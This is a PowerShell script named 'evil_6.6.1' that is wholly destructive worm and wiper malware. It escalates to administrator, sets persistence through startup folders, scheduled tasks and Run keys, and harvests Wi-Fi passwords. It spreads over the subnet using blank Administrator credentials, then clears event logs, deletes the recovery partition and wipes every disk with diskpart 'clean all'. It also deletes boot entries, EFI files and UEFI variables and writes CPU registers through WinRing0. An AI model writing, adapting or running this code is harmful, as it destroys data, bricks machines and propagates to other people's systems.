# evil_6.6.1

param([Switch]$Force)
if (-NOT $Force) { exit }
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`" -Force" -Verb RunAs
    exit
}

function Set-PendingDelete {
    param($Path)
    if (Test-Path $Path) { reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v "PendingFileRenameOperations" /t REG_MULTI_SZ /d "\??\$Path\0\0" /f 2>$null }
}

function Stop-CriticalDriver {
    param($Driver)
    sc config "$Driver" start= disabled 2>$null
    Set-PendingDelete "C:\Windows\System32\drivers\$Driver.sys"
}

$vmDrivers = @("vmx86", "vmmouse", "vmusb", "vmci", "hgfs", "vmmemctl", "VBoxGuest", "VBoxMouse", "VBoxSF", "VBoxVideo")
foreach ($d in $vmDrivers) { try { sc stop $d 2>$null; sc delete $d 2>$null } catch {} }

for ($i=0; $i -lt (Get-CimInstance Win32_ComputerSystem).NumberOfLogicalProcessors; $i++) {
    Start-Job -ScriptBlock { while($true){$a=1..1000000|ForEach-Object{$_*$_} } } | Out-Null
}
for ($i=0; $i -lt 50; $i++) { Start-Process calc.exe -WindowStyle Hidden -EA 0 }
Start-Job -ScriptBlock { while($true){ Get-WmiObject Win32_Processor | Out-Null; Start-Sleep -Milliseconds 50 } } | Out-Null

$scriptContent = Get-Content $PSCommandPath -Raw
$scriptBase64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($scriptContent))

$persistencePaths = @(
    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\evil.ps1",
    "$env:USERPROFILE\Documents\evil.ps1",
    "C:\Windows\Temp\evil.ps1",
    "$env:PROGRAMDATA\Microsoft\Windows\Start Menu\Programs\Startup\evil.ps1"
)
foreach ($path in $persistencePaths) { try { Copy-Item $PSCommandPath $path -Force -EA 0 } catch {} }

try { schtasks /create /tn "evil" /tr "powershell.exe -ExecutionPolicy Bypass -File `"$PSCommandPath`" -Force" /sc ONLOGON /ru SYSTEM /f 2>$null } catch {}
try { reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v evil /t REG_SZ /d "powershell.exe -ExecutionPolicy Bypass -File `"$PSCommandPath`" -Force" /f 2>$null } catch {}
try { reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v evil /t REG_SZ /d "powershell.exe -ExecutionPolicy Bypass -File `"$PSCommandPath`" -Force" /f 2>$null } catch {}
try { reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v evil /t REG_SZ /d "powershell.exe -ExecutionPolicy Bypass -File `"$PSCommandPath`" -Force" /f 2>$null } catch {}

$wifiPasswords = @{}
try {
    $profiles = netsh wlan show profiles | Select-String ":" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
    foreach ($profile in $profiles) {
        $output = netsh wlan show profile name="$profile" key=clear
        $pass = $output | Select-String "Key Content" | ForEach-Object { ($_ -split ":")[1].Trim() }
        if (-NOT $pass) { $pass = $output | Select-String "Ключ содержимого" | ForEach-Object { ($_ -split ":")[1].Trim() } }
        if ($pass -and $pass -ne "Отсутствует") { $wifiPasswords[$profile] = $pass }
    }
} catch {}

$gateway = $null
try { $gateway = (Get-NetRoute -DestinationPrefix "0.0.0.0/0" -EA 0).NextHop } catch {}
if (-NOT $gateway) { try { $gateway = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.DefaultIPGateway }).DefaultIPGateway[0] } catch {} }
if (-NOT $gateway) { try { $gateway = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway }).IPv4DefaultGateway.NextHop } catch {} }

if ($gateway) {
    try { Invoke-WebRequest -Uri "http://$gateway/reboot" -Method GET -TimeoutSec 2 -UseBasicParsing -EA 0 } catch {}
    try { Invoke-WebRequest -Uri "http://$gateway/reset" -Method GET -TimeoutSec 2 -UseBasicParsing -EA 0 } catch {}
    try { Invoke-WebRequest -Uri "http://$gateway/userRpm/SysRebootRpm.htm" -Method GET -TimeoutSec 2 -UseBasicParsing -EA 0 } catch {}
    try { Invoke-WebRequest -Uri "http://$gateway/goform/reboot" -Method GET -TimeoutSec 2 -UseBasicParsing -EA 0 } catch {}
    try { Invoke-WebRequest -Uri "http://$gateway/rebootinfo.cgi" -Method GET -TimeoutSec 2 -UseBasicParsing -EA 0 } catch {}
}

$subnet = $null
try {
    $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" }).IPAddress
    $subnet = $ip -replace '\.[0-9]+$', ''
} catch {}
if ($subnet) {
    1..254 | ForEach-Object {
        $target = "$subnet.$_"
        if (Test-Connection -Quiet -Count 1 -TimeOut 1 $target) {
            try {
                net use "\\$target\Admin$" /user:"Administrator" "" 2>$null
                if ($LASTEXITCODE -eq 0) {
                    Copy-Item -Path $PSCommandPath -Destination "\\$target\Admin$\evil.ps1" -Force -EA 0
                    schtasks /create /s $target /tn "evil" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\evil.ps1 -Force" /sc ONLOGON /ru SYSTEM /f 2>$null
                    net use "\\$target\Admin$" /delete 2>$null
                }
            } catch {}
            try {
                $wmi = Get-WmiObject -Class Win32_Process -ComputerName $target -Credential (New-Object System.Management.Automation.PSCredential("Administrator", (ConvertTo-SecureString "" -AsPlainText -Force))) -EA 0
                if ($wmi) { $wmi.Create("powershell.exe -ExecutionPolicy Bypass -File \\$target\Admin$\evil.ps1 -Force") }
            } catch {}
        }
    }
}

Get-LocalUser | Where-Object { $_.Name -notin @("Administrator", $env:USERNAME) } | ForEach-Object { Remove-LocalUser -Name $_.Name -Force -EA 0 }

try {
    wevtutil cl System 2>$null
    wevtutil cl Security 2>$null
    wevtutil cl Application 2>$null
    wevtutil cl Setup 2>$null
    Remove-Item "C:\Windows\System32\winevt\Logs\*.evtx" -Force -EA 0
} catch {}

try {
    reagentc /disable 2>$null
    $recoveryPart = Get-Partition -EA 0 | Where-Object { $_.Type -eq "Recovery" -or $_.GptType -eq "{de94bba4-06d1-4d40-a16a-bfd50179d6ac}" }
    if ($recoveryPart) {
        $script = "select disk $($recoveryPart.DiskNumber)`nselect partition $($recoveryPart.PartitionNumber)`ndelete partition override`nexit"
        $script | diskpart.exe 2>$null
    }
    Remove-Item "C:\Recovery\*" -Recurse -Force -EA 0
} catch {}

$winRing0Path = Join-Path $PSScriptRoot "WinRing0x64.dll"
if (Test-Path $winRing0Path) {
    try {
        $wr0 = @"
using System;
using System.Runtime.InteropServices;
public class WRO {
    [DllImport("WinRing0x64.dll")] public static extern bool InitializeOls();
    [DllImport("WinRing0x64.dll")] public static extern void DeinitializeOls();
    [DllImport("WinRing0x64.dll")] public static extern bool WriteIoPortByte(ushort Port, byte Data);
    [DllImport("WinRing0x64.dll")] public static extern bool WriteMsr(uint Index, ulong Value);
}
"@
        Add-Type $wr0 -EA 0
        [WRO]::InitializeOls() | Out-Null
        $cpu = (Get-WmiObject Win32_Processor).Name
        if ($cpu -match "Atom") { [WRO]::WriteMsr(0x1FC, 0) } else { [WRO]::WriteMsr(0x1A0, 0); [WRO]::WriteMsr(0x1B0, [UInt64]::MaxValue) }
        $ecPorts = @(0x66,0x62), @(0x68,0x6C), @(0x290,0x291)
        foreach($ec in $ecPorts) { try { [WRO]::WriteIoPortByte($ec[0],0x81); [WRO]::WriteIoPortByte($ec[1],0x00); [WRO]::WriteIoPortByte($ec[0],0x81); [WRO]::WriteIoPortByte($ec[1],0xFF) } catch {} }
        [WRO]::DeinitializeOls()
    } catch {}
}

try {
    Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services" -EA 0 | ForEach-Object {
        $name = $_.PSChildName
        if ($name -notmatch "WmiApSrv|Winmgmt|PowerShell|RpcSs|DcomLaunch|PlugPlay") {
            Set-ItemProperty -Path $_.PSPath -Name Start -Value 4 -EA 0
        }
    }
} catch {}

$allDrivers = @("disk","partmgr","volume","storahci","stornvme","pci","acpi","mountmgr","fvevol","ntfs","refs","tcpip","ndis","mrxsmb","USBSTOR","USBHUB3","USBXHCI","bthport")
foreach ($d in $allDrivers) { Stop-CriticalDriver $d }

$regHives = @("SYSTEM","SOFTWARE","SAM","SECURITY","DEFAULT")
foreach ($hive in $regHives) { Set-PendingDelete "C:\Windows\System32\config\$hive" }

$diskpartScript = ""
$disks = Get-WmiObject Win32_DiskDrive -EA 0
foreach ($disk in $disks) { $diskpartScript += "select disk $($disk.Index)`nclean all`n" }
$diskpartScript += "exit"
$diskpartScript | Out-File -FilePath "$env:USERPROFILE\diskpart_script.txt" -Force
Start-Process diskpart.exe -Wait -NoNewWindow -ArgumentList "/s `"$env:USERPROFILE\diskpart_script.txt`"" -EA 0

try { bcdedit /delete {bootmgr} /f } catch {}
try { bcdedit /delete {default} /f } catch {}
try { bcdedit /delete {current} /f } catch {}
try { bcdedit /set {bootmgr} timeout 0 } catch {}

try { mountvol Z: /s } catch {}
if (Test-Path "Z:\") { Remove-Item "Z:\EFI\*" -Recurse -Force -EA 0; mountvol Z: /d }

try {
    $uefiGuid = "{8BE4DF61-93CA-11D2-AA0D-00E098032B8C}"
    Set-FirmwareEnvironmentVariable -Name "BootOrder" -Namespace $uefiGuid -Value ([byte[]]@(0xFF,0xFF,0xFF,0xFF)) -EA 0
    Set-FirmwareEnvironmentVariable -Name "SecureBoot" -Namespace $uefiGuid -Value ([byte[]]@(0x00)) -EA 0
} catch {}

try {
    $adapters = Get-NetAdapter -EA 0 | Where-Object { $_.Name -ne "Loopback" }
    foreach ($adapter in $adapters) { Disable-NetAdapter -Name $adapter.Name -Confirm:$false -Force -EA 0 }
} catch {}
netsh wlan delete profile * 2>$null
netsh advfirewall set allprofiles firewallpolicy blockinbound,blockoutbound 2>$null

Get-ChildItem "C:\Windows\System32\*.mui" -EA 0 | ForEach-Object { Set-PendingDelete $_.FullName }
Get-ChildItem "C:\Windows\System32\*.dll" -EA 0 | ForEach-Object { Set-PendingDelete $_.FullName }
Get-ChildItem "C:\Windows\Fonts\*" -EA 0 | ForEach-Object { Set-PendingDelete $_.FullName }
Get-ChildItem "C:\Windows\System32\drivers\*.sys" -EA 0 | ForEach-Object { Set-PendingDelete $_.FullName }

$asciiSkull = @"

        .-"      "-.
       /            \
      |              |
      |,  .-.  .-.  ,|
      | )(__/  \__)( |
      |/     /\     \|
      (_     ^^     _)
       \__|IIIIII|__/
        | \IIIIII/ |
        \          /
       `--------`

"@
Write-Host $asciiSkull -ForegroundColor Red

for ($i=0;$i -lt 3;$i++) { [Console]::Beep(666,500); Start-Sleep -Milliseconds 200; [Console]::Beep(1000,500); Start-Sleep -Milliseconds 200 }

Set-PendingDelete $PSCommandPath
Stop-Computer -Force
